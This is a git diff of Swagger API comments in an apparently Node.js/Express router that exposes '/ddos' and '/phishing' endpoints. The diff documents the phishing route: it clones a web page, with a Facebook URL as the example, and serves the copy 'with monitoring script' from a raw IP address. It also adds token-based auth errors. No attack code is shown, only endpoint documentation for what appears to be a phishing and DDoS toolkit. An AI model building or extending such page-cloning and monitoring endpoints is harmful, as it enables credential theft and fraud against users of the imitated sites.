@@ -317,10 +317,8 @@ router.post('/ddos', ddos);
  *             properties:
  *               url:
  *                 type: string
+ *                 description: The URL of the web page to copy
  *                 example: "https://fr-fr.facebook.com/"
- *               outputDir:
- *                 type: string
- *                 example: "./copied_page"
  *     responses:
  *       200:
  *         description: HTML saved successfully
@@ -331,16 +329,21 @@ router.post('/ddos', ddos);
  *               properties:
  *                 message:
  *                   type: string
- *                   example: "Web page copied successfully."
- *                 outputDir:
+ *                   example: "Web page copied successfully with monitoring script."
+ *                 url:
  *                   type: string
- *                   example: "./output"
+ *                   example: "http://31.207.34.16:5000/generated/copied_page/index.html"
  *       400:
  *         description: Missing or invalid fields
+ *       401:
+ *         description: Unauthorized, no token provided or token invalid
+ *       403:
+ *         description: Access denied, insufficient permissions
  *       500:
  *         description: Internal server error
  */
 router.post('/phishing', fetchHtmlFromUrl);
+
 
 
 //router.post('/write-to-file', writeToFile);
